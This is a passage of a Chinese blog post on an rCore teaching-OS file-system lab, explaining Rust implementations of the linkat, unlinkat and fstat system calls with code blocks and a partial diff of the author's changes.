keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// inode id</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">// last position of data of inode</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">read_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        id <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find_inode_id</span><span class="token punctuation">(</span>old_name<span class="token punctuation">,</span> dinode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        offset <span class="token operator">=</span> dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// increase reference count</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> new_entry <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// insert a new directory entry into ROOT_DIR</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> new_entry<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">0</span><span class="token punctuation">&#125;</span></code></pre><h3 id="unlinkat"><a href="#unlinkat" class="headerlink" title="unlinkat"></a>unlinkat</h3><p>第二个需要实现的是取消硬链接的 <code>unlinkat</code>，基本思路为：根据文件名 <code>name</code> 查找对应的 inode，将引用计数减一，最后将其根目录下对应的目录项移除。下面直接介绍具体实现方法：</p><ol><li>使用 <code>self.find(name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>inode.modify_disk_inode()</code> 获取 <code>inode</code> 文件的 <code>DiskInode</code> 的可变引用。将引用计数减一，如果引用计数减为零，代表该文件的所有硬链接都被解除，此时可以使用 <code>inode.clear()</code> 释放该文件 inode 和数据的内存空间。</li><li>使用 <code>self.modify_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的可变引用。遍历当前目录下的所有目录项，将名称为 <code>name</code> 的目录项移除（为了实现的方便，可以直接用空的目录项覆写）。</li></ol><blockquote><p>在我的测试中，使用 <code>inode.clear()</code> 清空文件 inode 和数据内存空间的操作可能会在测试样例 <code>ch6_file3</code> 处超时，但测试样例不会对此进行测试，因此如果出现超时的情况，可以考虑移除这一操作。</p></blockquote><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove a hard link with name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">unlinkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> is_zero_link <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> dinode<span class="token punctuation">.</span>nlink <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>            is_zero_link <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test will timeout with the code below, what the fuck??</span>    <span class="token comment">// Free memory of inode and file data</span>    <span class="token keyword">if</span> is_zero_link <span class="token punctuation">&#123;</span>        inode<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> res <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Remove(For simplisity, not remove, just set to empty)</span>        <span class="token comment">// the directory entry with name in the ROOT_DIR</span>        <span class="token keyword">let</span> fcnt <span class="token operator">=</span> <span class="token punctuation">(</span>dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>fcnt <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>                dinode<span class="token punctuation">.</span><span class="token function">read_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token constant">DIRENT_SZ</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> dirent<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> name <span class="token punctuation">&#123;</span>                dirent <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dinode<span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token constant">DIRENT_SZ</span><span class="token punctuation">,</span> dirent<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>block_device<span class="token punctuation">)</span><span class="token punctuation">;</span>                res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">&#125;</span></code></pre><h3 id="fstat"><a href="#fstat" class="headerlink" title="fstat"></a>fstat</h3><p>第三个需要实现的是获取文件状态的 <code>fstat</code>，相较于 <code>linkat</code> 和 <code>unlinkat</code> 来说要复杂一些。</p><p>首先要解决的问题是：如何根据文件描述符 <code>fd</code> 获取其对应的 <code>Inode</code> 结构？这里必须要明确一个概念，所谓文件描述符，本质上只是一个无符号整型，其值为对应文件在当前进程文件描述符表中的 <strong>索引</strong> 。文件描述符表的元素为一个 trait 对象（在其他面向对象语言中相当于虚基类）<code>dyn File</code>，它表示一个抽象的“文件”实体。该“虚基类”有三种具体实现：标准输入 <code>Stdin</code>、标准输出 <code>Stdout</code> 和普通文件 <code>OSInode</code>，我们需要关注的便是 <code>OSInode</code> 的实现。</p><p>一种直接的想法是直接对 <code>OSInode</code> 数据结构进行扩展，为其实现 <code>fstat</code> 操作。但是请注意，文件描述符表的元素类型为虚基类 <code>File</code>，因此它无法直接调用其“派生类” <code>OSInode</code> 中所实现的方法，因此在这里我选择为 <code>File</code> 这个 trait 添加 <code>get_stat</code> 方法，并在 <code>OSInode</code> 中对其进行具体实现（<code>Stdin</code> 和 <code>Stdout</code> 也要实现，可以选择加一个 <code>panic!(&quot;Not implemented!&quot;);</code> 进行占位）。</p><blockquote><p>我对 Rust 还不太了解，不过我推测这里应该可以使用类似 C++ 中的动态类型转换 <code>dynamic_cast</code> 将 <code>dyn File</code> 类型转换为 <code>OSInode</code>，请读者批评指正。</p></blockquote><p>构建起文件描述符到 <code>Inode</code> 的接口后，便可以开始具体实现 <code>fstat</code> 了，需要获取三个文件状态：inode_id、文件类型（普通文件或目录）、硬链接数量。接下来分别介绍：</p><p>首先是 inode_id，在 rCore 的文件系统实现中，inode_id（索引结点号）和文件描述符类似，也是 <strong>索引</strong> ，指向其对应的 <code>DiskInode</code> 在 inode 位图中的位置。因此我们可以通过 <code>Inode</code> 结构中的 <code>block_id</code> 和 <code>block_offset</code> 将 inode_id 计算出来，计算方式如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Get inode id based upon block id and block offset</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_ino</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> block_id<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> block_offset<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> inode_size <span class="token operator">=</span> <span class="token function">size_of</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">DiskInode</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> inode_cnt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BLOCK_SZ</span> <span class="token operator">/</span> inode_size<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>block_id <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inode_area_start_block <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token operator">*</span> inode_cnt <span class="token operator">+</span> block_offset <span class="token operator">/</span> inode_size<span class="token punctuation">&#125;</span></code></pre><p>文件类型和硬链接数量的获取比较简单，可以通过使用 <code>read_disk_inode</code> 获取 <code>inode</code> 对应的 <code>DiskInode</code> 的只读引用，并从中读取相关信息即可。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>前向兼容可以借助 <code>git cherry-pick</code> 命令将其他分支的提交移植到当前分支，有关它的具体用法，可以参考我写的 Chapter5 练习中的介绍。</p><p>需要非常注意的一点是，<code>spawn</code> 系统调用移植后，需要添加 <strong>拷贝父进程文件描述符表</strong> 的操作，否则可能就会导致测试程序无法被正常加载（本章测试进程使用 <code>spawn</code> 系统调用进行创建）。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/easy-fs/src/efs.rs b/easy-fs/src/efs.rsindex 202b9eb..52828c2 100644<span class="token coord">--- a/easy-fs/src/efs.rs</span><span class="token coord">+++ b/easy-fs/src/efs.rs</span><span class="token coord">@@ -1,3 +1,5 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    block_cache_sync_all, get_block_cache, Bitmap, BlockDevice, DiskInode, DiskInodeType, Inode,</span><span class="token prefix unchanged"> </span><span class="token line">    SuperBlock,</span></span>@@ -148,4 +150,11 @@ impl EasyFileSystem &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            (block_id - self.data_area_start_block) as usize,</span><span class="token prefix unchanged"> </span><span class="token line">        )</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode id based upon block id and block offset</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self, block_id: usize, block_offset: usize) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inode_size = size_of::&lt;DiskInode>();</span><span class="token prefix inserted">+</span><span class="token line">        let inode_cnt = (BLOCK_SZ / inode_size) as usize;</span><span class="token prefix inserted">+</span><span class="token line">        (block_id - self.inode_area_start_block as usize) * inode_cnt + block_offset / inode_size</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/easy-fs/src/layout.rs b/easy-fs/src/layout.rsindex 0a3ac79..692f5e7 100644<span class="token coord">--- a/easy-fs/src/layout.rs</span><span class="token coord">+++ b/easy-fs/src/layout.rs</span>@@ -70,7 +70,9 @@ impl SuperBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// Type of a disk inode</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(PartialEq)]</span><span class="token prefix unchanged"> </span><span class="token line">pub enum DiskInodeType &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// file type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    File,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// directory type</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    Directory,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -86,6 +88,7 @@ pub struct DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub indirect1: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    pub indirect2: u32,</span><span class="token prefix unchanged"> </span><span class="token line">    type_: DiskInodeType,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub nlink: u32,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl DiskInode &#123;</span></span>@@ -97,6 +100,7 @@ impl DiskInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.indirect1 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.indirect2 = 0;</span><span class="token prefix unchanged"> </span><span class="token line">        self.type_ = type_;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        self.nlink = 1;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Whether this inode is a directory</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_dir(&amp;self) -> bool &#123;</span></span>diff --git a/easy-fs/src/lib.rs b/easy-fs/src/lib.rsindex 822c237..d146f19 100644<span class="token coord">--- a/easy-fs/src/lib.rs</span><span class="token coord">+++ b/easy-fs/src/lib.rs</span>@@ -16,3 +16,4 @@ pub use block_dev::BlockDevice;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use efs::EasyFileSystem;</span><span class="token prefix unchanged"> </span><span class="token line">use layout::*;</span><span class="token prefix unchanged"> </span><span class="token line">pub use vfs::Inode;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use layout::DiskInodeType;</span></span>\ No newline at end of filediff --git a/easy-fs/src/vfs.rs b/easy-fs/src/vfs.rsindex 9908385..cb56ad9 100644<span class="token coord">--- a/easy-fs/src/vfs.rs</span><span class="token coord">+++ b/easy-fs/src/vfs.rs</span>@@ -183,4 +183,93 @@ impl Inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span><span class="token prefix unchanged"> </span><span class="token line">        block_cache_sync_all();</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Create a hard link with new_name for file with old_name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn linkat(&amp;self, old_name: &amp;str, new_name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with old_name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(old_name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut id = 0;         // inode id</span><span class="token prefix inserted">+</span><span class="token line">        let mut offset = 0;     // last position of data of inode</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            id = self.find_inode_id(old_name, dinode).unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            offset = dinode.size as usize;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink += 1;  // increase reference count</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        let new_entry = DirEntry::new(new_name, id);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // insert a new directory entry into ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">        self.write_at(offset, new_entry.as_bytes());</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Remove a hard link with name</span><span class="token prefix inserted">+</span><span class="token line">    pub fn unlinkat(&amp;self, name: &amp;str) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // get inode of file with name</span><span class="token prefix inserted">+</span><span class="token line">        let inode = self.find(name);</span><span class="token prefix inserted">+</span><span class="token line">        if inode.is_none() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let inode = inode.unwrap();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        let mut is_zero_link = false;</span><span class="token prefix inserted">+</span><span class="token line">        inode.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dinode.nlink -= 1;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.nlink == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                is_zero_link = true;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // Test will timeout with the code below, what the fuck??</span><span class="token prefix inserted">+</span><span class="token line">        // Free memory of inode and file data</span><span class="token prefix inserted">+</span><span class="token line">        // if is_zero_link &#123;</span><span class="token prefix inserted">+</span><span class="token line">        //     inode.clear();</span><span class="token prefix inserted">+</span><span class="token line">        // &#125;</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        let mut res = -1;</span><span class="token prefix inserted">+</span><span class="token line">        self.modify_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            // Remove(For simplisity, not remove, just set to empty) </span><span class="token prefix inserted">+</span><span class="token line">            // the directory entry with name in the ROOT_DIR</span><span class="token prefix inserted">+</span><span class="token line">            let fcnt = (dinode.size as usize) / DIRENT_SZ;</span><span class="token prefix inserted">+</span><span class="token line">            for i in 0..fcnt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                let mut dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                assert_eq!(</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.read_at(i * DIRENT_SZ, dirent.as_bytes_mut(), &amp;self.block_device),</span><span class="token prefix inserted">+</span><span class="token line">                    DIRENT_SZ</span><span class="token prefix inserted">+</span><span class="token line">                );</span><span class="token prefix inserted">+</span><span class="token line">                if dirent.name() == name &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    dirent = DirEntry::empty();</span><span class="token prefix inserted">+</span><span class="token line">                    dinode.write_at(i * DIRENT_SZ, dirent.as_bytes(), &amp;self.block_device);</span><span class="token prefix inserted">+</span><span class="token line">                    res = 0;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        res</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get nlink of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_nlink(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut nlink = 0;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            nlink = dinode.nlink;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        nlink</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get file type of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_file_type(&amp;self) -> DiskInodeType &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut ftype = DiskInodeType::File;</span><span class="token prefix inserted">+</span><span class="token line">        self.read_disk_inode(|dinode| &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if dinode.is_dir() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                ftype = DiskInodeType::Directory;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        ftype</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get inode number of the inode</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_ino(&amp;self) -> u32 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let fs = self.fs.lock();</span><span class="token prefix inserted">+</span><span class="token line">        fs.get_ino(self.block_id, self.block_offset) as u32</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -25,3 +25,5 @@ pub const CLOCK_FREQ: usize = 12500000;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span><span class="token prefix unchanged"> </span><span class="token line">/// The base address of control registers in Virtio_Block device</span><span class="token prefix unchanged"> </span><span class="token line">pub const MMIO: &amp;[(usize, usize)] = &amp;[(0x10001000, 0x1000)];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>diff --git a/os/src/fs/inode.rs b/os/src/fs/inode.rsindex 3f1f208..7c63086 100644<span class="token coord">--- a/os/src/fs/inode.rs</span><span class="token coord">+++ b/os/src/fs/inode.rs</span><span class="token coord">@@ -4,14 +4,14 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!</span><span class="token prefix unchanged"> </span><span class="token line">//! `UPSafeCell&lt;OSInodeInner>` -> `OSInode`: for static `ROOT_INODE`,we</span><span class="token prefix unchanged"> </span><span class="token line">//! need to wrap `OSInodeInner` into `UPSafeCell`</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use super::&#123;File, Stat, StatMode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::drivers::BLOCK_DEVICE;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use bitflags::*;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use easy_fs::&#123;EasyFileSystem, Inode&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use easy_fs::&#123;DiskInodeType, EasyFileSystem, Inode&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// inode in memory</span></span>@@ -55,6 +55,7 @@ impl OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">lazy_static! &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The inode of root directory</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub static ref ROOT_INODE: Arc&lt;Inode> = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        let efs = EasyFileSystem::open(BLOCK_DEVICE.clone());</span><span class="token prefix unchanged"> </span><span class="token line">        Arc::new(EasyFileSystem::root_inode(&amp;efs))</span></span>@@ -155,4 +156,15 @@ impl File for OSInode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        total_write_size</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let ino = inner.inode.get_ino() as u64;</span><span class="token prefix inserted">+</span><span class="token line">        let mode = match inner.inode.get_file_type() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::File => StatMode::FILE,</span><span class="token prefix inserted">+</span><span class="token line">            DiskInodeType::Directory => StatMode::DIR,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;;</span><span class="token prefix inserted">+</span><span class="token line">        let nlink = inner.inode.get_nlink();</span><span class="token prefix inserted">+</span><span class="token line">        Stat::new(ino, mode, nlink)</span><span class="token prefix inserted">+</span><span class="token 